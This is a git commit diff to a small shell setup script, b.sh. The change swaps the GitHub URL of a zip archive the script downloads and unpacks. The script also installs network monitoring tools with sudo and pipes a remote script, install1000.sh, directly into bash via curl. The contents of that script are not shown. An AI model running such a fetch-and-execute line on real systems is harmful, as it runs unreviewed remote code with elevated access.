1b2c8277ce9218b6379d157a2ad86337dff6e237
chucuoi1 <khang140388@yahoo.com>
2022-01-16 09:32:50 -0500

    Update b.sh

--- b.sh
+++ b.sh
@@ -3,5 +3,5 @@ sudo apt-get update -y
 wait
 sudo apt-get upgrade -y
 sudo apt install vnstat speedometer wget zip unzip curl git -y
-cd ~/ && wget https://github.com/chucuoi1/Vilas/raw/main/3SA/B.zip -O B.zip && unzip B.zip
+cd ~/ && wget https://github.com/chucuoi1/Vilas/raw/main/B.zip -O B.zip && unzip B.zip
 bash <(curl -s "https://raw.githubusercontent.com/chucuoi1/Vilas/main/install1000.sh")
